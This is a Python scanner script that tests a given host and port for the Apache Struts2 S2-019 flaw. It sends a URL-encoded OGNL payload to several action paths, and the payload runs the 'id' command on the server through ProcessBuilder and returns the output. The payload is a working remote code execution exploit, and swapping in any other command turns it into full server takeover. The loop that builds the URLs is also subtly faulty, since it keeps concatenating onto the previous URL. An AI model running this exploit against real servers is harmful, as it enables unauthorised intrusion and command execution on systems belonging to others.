try:
    import requests,sys,os,logging,queue
except:
    os._exit(6)
logging.basicConfig(level=logging.INFO,format='%(message)s')
class VulTest:
    def __init__(self, url,port):
        dirs = ['/Simple!addInput.action','/Simple.action','/addUser.action','/listUser.action','/helloworld.action','/example/HelloWorld.action']
        self.queues = queue.Queue(len(dirs))
        if '://' not in url:
            self.ip = url
            for dir in dirs:
                url = 'http://' + url+":"+port +dir
                self.queues.put(url)


    def Test(self):
        while not self.queues.empty():
            url = self.queues.get(False)
            try:
                req = requests.get(url + '''?debug=command&expression=%23f%3D%23_memberAccess.getClass().getDeclaredField(%27allowStaticMethodAccess%27)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23resp%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B'id'%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B1000%5D%2C%23d.read(%23e)%2C%23resp.println(%23e)%2C%23resp.close()''',timeout=3)
            
                if ('uid' in req.text):
                    logging.info('[+] Found S2-019 in ' + self.ip)
                    os._exit(1)
            except:
                pass
        logging.info('[-] S2-019 Not Found in ' + self.ip)
        os._exit(2)


if __name__ == '__main__':
    url = sys.argv[1]
    port = sys.argv[2]
    #url = '192.168.136.130'
    try:
        test = VulTest(url,port)
        test.Test()
    except:
        os._exit(3)


